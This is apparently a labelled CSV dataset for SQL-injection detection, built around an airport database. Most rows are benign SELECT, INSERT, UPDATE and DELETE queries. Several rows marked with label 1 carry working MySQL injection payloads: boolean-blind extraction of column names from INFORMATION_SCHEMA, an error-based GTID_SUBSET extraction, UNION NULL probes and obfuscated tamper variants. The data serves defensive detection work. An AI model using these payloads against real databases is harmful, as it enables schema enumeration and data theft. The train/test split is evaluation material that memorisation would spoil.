full_query,label,user_inputs,attack_stage,tamper_method,attack_status,statement_type,query_template_id,attack_id,attack_technique,split
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 150.0 AND 2086.0",0,150.0 2086.0,,,,select,airport-S2,,,train
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4835"" AS SIGNED) AND a.iso_country = ""IL"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4835 IL,,,,select,airport-S22,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Kamloops;""",0,Kamloops,,,,select,airport-S21,,,test
SELECT * FROM airport WHERE icao_code = 'LFCC';,0,LFCC,,,,select,airport-S1,,,test
"SELECT * FROM airport WHERE gps_code = ""72AZ"" OR local_code = ""WY50""",0,72AZ WY50,,,,select,airport-S4,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Bilasuvar District"";",0,Bilasuvar District,,,,select,airport-S15,,,train
"UPDATE countries SET keywords = ""Airports in San Marino"" WHERE code = ""NG"";",0,Airports in San Marino NG,,,,update,airport-U8,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""GM-L"", ""05"", ""Bolama Region"", ""EU"", ""BS"")",0,GM-L 05 Bolama Region EU BS,,,,insert,airport-I5,,,test
"UPDATE regions SET keywords = ""Airports in Kyrenia District"" WHERE iso_country = ""TW"";",0,Airports in Kyrenia District TW,,,,update,airport-U9,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AF"" GROUP BY r.name ORDER BY r.name ASC;",0,AF,,,,select,airport-S5,,,train
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""GR-C""",0,AS GR-C,,,,select,airport-S8,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""US-1000"", ""closed"", ""AZ Landing Strip"", 68.832916, -87.991699)",0,US-1000 closed AZ Landing Strip 68.832916 -87.991699,,,,insert,airport-I1,,,test
"DELETE FROM airport WHERE name LIKE ""Les Sangliers Heliport"" OR keywords LIKE ""New Jersey Steel Helistop"";  ",0,Les Sangliers Heliport New Jersey Steel Helistop,,,,delete,airport-D3,,,train
"SELECT id FROM airports WHERE scheduled_service = ""no"" AND elevation_feet BETWEEN 4098.0 AND 3937.0 AND longitude >= -86.52698 AND latitude <= 31.147939",0,no 4098.0 3937.0 -86.52698 31.147939,,,,select,airport-S23,,,train
"INSERT INTO countries (code, name, continent, keywords) VALUES (""SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x636f756e7472696573 AND table_schema LIKE 0x64617461736574 LIMIT 5,1),8,1))>112,2888) AND ""SD"" LIKE ""SD"", ""Tanzania"", ""EU"", ""Airports in Sint Maarten"")",1," SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x636f756e7472696573 AND table_schema LIKE 0x64617461736574 LIMIT 5,1),8,1))>112,2888) AND ""SD"" LIKE ""SD Tanzania EU Airports in Sint Maarten ",exploit,equaltolike,success,insert,airport-I6,boolean-30,boolean,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""IN-0349"";",0,IN-0349,,,,select,airport-S7,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Usina União Industria Private Airport"");",0,Usina União Industria Private Airport,,,,select,airport-S12,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (74683, 5311, ""NZCH"", ""MISC"", ""MISC"", 655.9)",0,74683 5311 NZCH MISC MISC 655.9,,,,insert,airport-I8,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""US-5422"",""closed"", ""Campo Veintisiete Airstrip"",""https://en.wikipedia.org/wiki/Nelson_Airport_(British_Columbia)"",""OC"")",0,US-5422 closed Campo Veintisiete Airstrip https://en.wikipedia.org/wiki/Nelson_Airport_(British_Columbia) OC,,,,insert,airport-I3,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BY"" GROUP BY r.name ORDER BY r.name ASC;",0,BY,,,,select,airport-S5,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Myrtle_Creek_Municipal_Airport"" WHERE ident = ""US-5803""",0,https://en.wikipedia.org/wiki/Myrtle_Creek_Municipal_Airport US-5803,,,,update,airport-U3,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Shiramentza;""",0,Shiramentza,,,,select,airport-S21,,,test
"DELETE FROM airport_frequencies WHERE type = ""ATF"";",0,ATF,,,,delete,airport-D4,,,test
"UPDATE countries SET keywords = ""Lentokentät, Suomen"" WHERE code = ""SB"";",0,"Lentokentät, Suomen SB",,,,update,airport-U8,,,train
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (13995, ""KCAG"", 2623.0, ""CONC"", 1, 0)",0,13995 KCAG 2623.0 CONC 1 0,,,,insert,airport-I9,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-1392"";",0,US-1392,,,,select,airport-S7,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""RIO"") OR name LIKE ""Agriflite Services""",0,RIO Agriflite Services,,,,select,airport-S10,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""03I"") OR name LIKE ""06R""",0,03I 06R,,,,select,airport-S10,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Rosiclare, Stone RLA"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""LSXW"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""German Diagnostic Clinic (DKD)"", ""%"");",0,"Rosiclare, Stone RLA LSXW German Diagnostic Clinic (DKD)",,,,select,airport-S17,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""4TS8"", ""small_airport"", ""Shoab 1 Platform Heliport"", -8.85837, 20.635156631469727, 2391.0)",0,4TS8 small_airport Shoab 1 Platform Heliport -8.85837 20.635156631469727 2391.0,,,,insert,airport-I2,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""SSCM"", ""small_airport"", ""Antelope Ranch Airport"", 28.618687, -109.45949, 272.0)",0,SSCM small_airport Antelope Ranch Airport 28.618687 -109.45949 272.0,,,,insert,airport-I2,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""TR"" GROUP BY r.name ORDER BY r.name ASC;",0,TR,,,,select,airport-S5,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""KLVN"";",0,KLVN,,,,select,airport-S7,,,train
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Jindal Heliport"" and 5099=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 17,1),6,1))>102) then 5099 else (select 6777 union select 1186) end))-- -""",1," Jindal Heliport  and 5099=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 17,1),6,1))>102) then 5099 else (select 6777 union select 1186) end))-- - ",exploit,lowercase,success,select,airport-S3,boolean-168,boolean,test
"DELETE FROM regions WHERE name = ""South Region"" AND 4163 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x6e617661696473 AND table_schema LIKE 0x64617461736574 LIMIT 18,1),5,1))>113) THEN 4163 ELSE (SELECT 5270 UNION SELECT 1703) END))-- -"";",1," South Region"" AND 4163 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x6e617661696473 AND table_schema LIKE 0x64617461736574 LIMIT 18,1),5,1))>113) THEN 4163 ELSE (SELECT 5270 UNION SELECT 1703) END))-- - ",exploit,equaltolike,success,delete,airport-D8,boolean-150,boolean,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""SE-BD""",0,EU SE-BD,,,,select,airport-S8,,,train
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""CN"") OR a.elevation_ft > 3291.0",0,CN 3291.0,,,,select,airport-S11,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""AR-B""",0,EU AR-B,,,,select,airport-S8,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 650.0 AND 83.0",0,650.0 83.0,,,,select,airport-S2,,,train
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""La Jibarera"") OR name LIKE ""LL69""",0,La Jibarera LL69,,,,select,airport-S10,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""MQ"" OR c.name LIKE CONCAT(""%"", ""Maldives"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,MQ Maldives 3,,,,select,airport-S20,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""PH-0504"", ""heliport"", ""Jinshan City Beach Seaplane Base"", 29.822399139404297, -62.8457984924, 1650.0)",0,PH-0504 heliport Jinshan City Beach Seaplane Base 29.822399139404297 -62.8457984924 1650.0,,,,insert,airport-I2,,,test
SELECT * FROM airport WHERE icao_code = 'KMLT';,0,KMLT,,,,select,airport-S1,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""SLPA"";",0,SLPA,,,,select,airport-S7,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""French Cay"";",0,French Cay,,,,select,airport-S15,,,test
"INSERT INTO countries (code, name, continent) VALUES (""BI"", ""Pitcairn"", ""EU"")",0,BI Pitcairn EU,,,,insert,airport-I7,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""IT""",0,IT,,,,select,airport-S9,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""DM"" GROUP BY r.name ORDER BY r.name ASC;",0,DM,,,,select,airport-S16,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Little River Airport"");",0,Little River Airport,,,,select,airport-S12,,,test
"UPDATE airport SET municipality = ""Zhilga"" WHERE iso_country = ""AR""",0,Zhilga AR,,,,update,airport-U2,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Fairbury Municipal Airport""",0,Fairbury Municipal Airport,,,,select,airport-S3,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""6MN7"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""YAH"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Аэропорт Красногорье"", ""%"");",0,6MN7 YAH Аэропорт Красногорье,,,,select,airport-S17,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Carnicobar"") OR name LIKE ""Campo di Volo """"Creva Air Club""""""",0,"Carnicobar Campo di Volo """"Creva Air Club""""",,,,select,airport-S10,,,test
"DELETE FROM navaids WHERE ident = ""RVA"";",0,RVA,,,,delete,airport-D6,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""NO"") OR a.elevation_ft > 482.0",0,NO 482.0,,,,select,airport-S11,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Meggiana Altiport""",0,Meggiana Altiport,,,,select,airport-S3,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Crystal_City-Pilot_Mound/Louise_Municipal_Airport"" WHERE ident = ""BR-2364""",0,https://en.wikipedia.org/wiki/Crystal_City-Pilot_Mound/Louise_Municipal_Airport BR-2364,,,,update,airport-U3,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-0102"";",0,US-0102,,,,select,airport-S7,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Cayuga Medical Center Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Cayuga Medical Center Heliport,,,,select,airport-S14,,,test
"DELETE FROM countries WHERE code = ""AU"";",0,AU,,,,delete,airport-D7,,,train
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""SDAJ"",""small_airport"", ""Fazenda Londrina II Airport"",""https://en.wikipedia.org/wiki/Daegu_Airport'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#"",""AS"")",1," SDAJ small_airport Fazenda Londrina II Airport https://en.wikipedia.org/wiki/Daegu_Airport'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL# AS ",recon,commentbeforeparentheses,failure,insert,airport-I3,union-14,union,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 162.0 AND GTID_SUBSET(CONCAT(0x717a787671,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e617661696473 AND table_schema=0x64617461736574 LIMIT 8,1),0x7170786a71),7718) AND 162.0 AND GTID_SUBSET(CONCAT(0x717a787671,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e617661696473 AND table_schema=0x64617461736574 LIMIT 8,1),0x7170786a71),7718)",1," 162.0 GTID_SUBSET(CONCAT(0x717a787671,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e617661696473 table_schema=0x64617461736574 LIMIT 8,1),0x7170786a71),7718) 162.0 GTID_SUBSET(CONCAT(0x717a787671,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e617661696473 table_schema=0x64617461736574 LIMIT 8,1),0x7170786a71),7718)",exploit,sleep2getlock,success,select,airport-S2,error-163,error,test
"DELETE FROM countries WHERE code = ""IL"";",0,IL,,,,delete,airport-D7,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""HR-05"", ""South Kurdufan State"", ""AF"", ""EE"", ""https://en.wikipedia.org/wiki/Municipality_of_Hoče-Slivnica"", ""-5713"")) as sTia where 5181=5181 or MAKE_SET(4890=4890,5539)-- BSrm"")",1," HR-05 South Kurdufan State AF EE https://en.wikipedia.org/wiki/Municipality_of_Hoče-Slivnica -5713 ) as sTia where 5181=5181 or MAKE_SET(4890=4890,5539)-- BSrm ",recon,lowercase,success,insert,airport-I4,boolean-18,boolean,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Sangermano,ACLI"") OR name LIKE ""Аэродром Тапа, EETA""",0,"Sangermano,ACLI Аэродром Тапа, EETA",,,,select,airport-S10,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BH"" GROUP BY r.name ORDER BY r.name ASC;",0,BH,,,,select,airport-S5,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""ZZ"" OR c.name LIKE CONCAT(""%"", ""Barbados"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,ZZ Barbados 3,,,,select,airport-S20,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""CL-ML""",0,AS CL-ML,,,,select,airport-S8,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""BH-13"", ""Central Region"", ""EU"", ""IE"", ""https://en.wikipedia.org/wiki/K%C3%A9mo"", ""Airports in Antioquía Department"")",0,BH-13 Central Region EU IE https://en.wikipedia.org/wiki/K%C3%A9mo Airports in Antioquía Department,,,,insert,airport-I4,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Kazo;""",0,Kazo,,,,select,airport-S21,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('CA-0504','WBKN','KAVQ','LPJF');",0,CA-0504 WBKN KAVQ LPJF,,,,update,airport-U10,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Lawa_Tabiki_Airstrip"" WHERE ident = ""CN27""",0,https://en.wikipedia.org/wiki/Lawa_Tabiki_Airstrip CN27,,,,update,airport-U3,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Bergen Airport, Flesland"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,"Bergen Airport, Flesland",,,,select,airport-S14,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (25906, ""LZPP"", 4000.0, ""TURF"", 0, 0)",0,25906 LZPP 4000.0 TURF 0 0,,,,insert,airport-I9,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 123.0 AND  130.45  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  126.7  AND  120.6  ORDER BY frequency;",0,123.0 130.45 126.7 120.6,,,,select,airport-S13,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""CW"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,CW 5,,,,select,airport-S19,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 780.0 AND 2513.0",0,780.0 2513.0,,,,select,airport-S2,,,test
"SELECT * FROM airport WHERE gps_code = ""HTSO"" OR local_code = ""CBF5""",0,HTSO CBF5,,,,select,airport-S4,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""SY9, Senneterre Water Aerodrome"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""II90"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""7WA6"", ""%"");",0,"SY9, Senneterre Water Aerodrome II90 7WA6",,,,select,airport-S17,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""London Airport"") OR name LIKE ""London Airport""",1, London Airport London Airport ,recon,randomcase,success,select,airport-S10,time-214,time,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 128.0 AND  121.5  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  118.3  AND  130.2  ORDER BY frequency;",0,128.0 121.5 118.3 130.2,,,,select,airport-S13,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 132.45 AND  126.2  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  118.9  AND  132.1  ORDER BY frequency;",0,132.45 126.2 118.9 132.1,,,,select,airport-S13,,,test
SHOW GLOBAL STATUS ,0,,,,,admin,airport-admin5,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Tver Oblast"";",0,Tver Oblast,,,,select,airport-S15,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Монгохто, Каменный Ручей"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""FL14"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""E21"", ""%"");",0,"Монгохто, Каменный Ручей FL14 E21",,,,select,airport-S17,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Epirus"";",0,Epirus,,,,select,airport-S15,,,test
"UPDATE countries SET keywords = ""Sierra Leonean airports""  WHERE   4339=4339   AND    4531=(   SELECT   (   CASE    WHEN    (   ORD(    MID((   SELECT       IFNULL(  CAST( column_name    AS       NCHAR   ),0x20)  FROM  INFORMATION_SCHEMA.   COLUMNS   WHERE       table_name  =0x6e617661696473   AND    table_schema=0x64617461736574     LIMIT   11,1),11,1))>108)     THEN    4531    ELSE    (   SELECT   9011   UNION        SELECT   8235)  END ))-- -"" WHERE code = ""IO"";",1," Sierra Leonean airports""  WHERE   4339=4339   AND    4531=(   SELECT   (   CASE    WHEN    (   ORD(    MID((   SELECT       IFNULL(  CAST( column_name    AS       NCHAR   ),0x20)  FROM  INFORMATION_SCHEMA.   COLUMNS   WHERE       table_name  =0x6e617661696473   AND    table_schema=0x64617461736574     LIMIT   11,1),11,1))>108)     THEN    4531    ELSE    (   SELECT   9011   UNION        SELECT   8235)  END ))-- - IO ",exploit,multiplespaces,success,update,airport-U8,boolean-96,boolean,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""US-FL""",0,SA US-FL,,,,select,airport-S8,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('JP-2118','JP-2118','JP-2118','JP-2118');",1, JP-2118 JP-2118 JP-2118 JP-2118 ,recon,multiplespaces,success,update,airport-U10,stacked-111,stacked,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""5884"" AS SIGNED) AND a.iso_country = ""LU"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,5884 LU,,,,select,airport-S22,,,train
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (50436, 19036, ""KLRY"", ""TWR"", ""APP"", 124.9)",0,50436 19036 KLRY TWR APP 124.9,,,,insert,airport-I8,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""US-KS""",0,EU US-KS,,,,select,airport-S8,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""LI"" OR c.name LIKE CONCAT(""%"", ""Georgia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 4 ORDER BY navaid_count DESC;",0,LI Georgia 4,,,,select,airport-S20,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""47M"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Manatuto"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Airports in Kiribati"", ""%"");",0,47M Airports in Manatuto Airports in Kiribati,,,,select,airport-S18,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Karibib;""",0,Karibib,,,,select,airport-S21,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""FR-1131"", ""heliport"", ""Temblador Airport')) UNIOn aLl SELECt nULl-- -"", 36.9874992371, 53.67729)",1, FR-1131 heliport Temblador Airport'   UNIOn aLl SELECt nULl-- - 36.9874992371 53.67729 ,recon,randomcase,failure,insert,airport-I1,union-2,union,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 122.3 AND  348.8  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  127.3  AND  118.8  ORDER BY frequency;",0,122.3 348.8 127.3 118.8,,,,select,airport-S13,,,test
"SELECT id FROM airports WHERE latitude BETWEEN 13.27495 AND -22.560973 AND name LIKE ""%Yz36SloV80RfSnAiXvzs%"" OR name LIKE ""%nxp9co9dXSCk6SpXFKsL%"" AND scheduled_service = ""no"" AND longitude BETWEEN 21.315093 AND -97.717003 AND type = ""closed""",0,13.27495 -22.560973 Yz36SloV80RfSnAiXvzs nxp9co9dXSCk6SpXFKsL no 21.315093 -97.717003 closed,,,,select,airport-S23,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""VG"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,VG 3,,,,select,airport-S19,,,train
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""SJUI"",""heliport"", ""Daewoo Trump Marine World Heliports"",""https://en.wikipedia.org/wiki/Laughlin/Bullhead_International_Airport"",""OC"")",0,SJUI heliport Daewoo Trump Marine World Heliports https://en.wikipedia.org/wiki/Laughlin/Bullhead_International_Airport OC,,,,insert,airport-I3,,,test
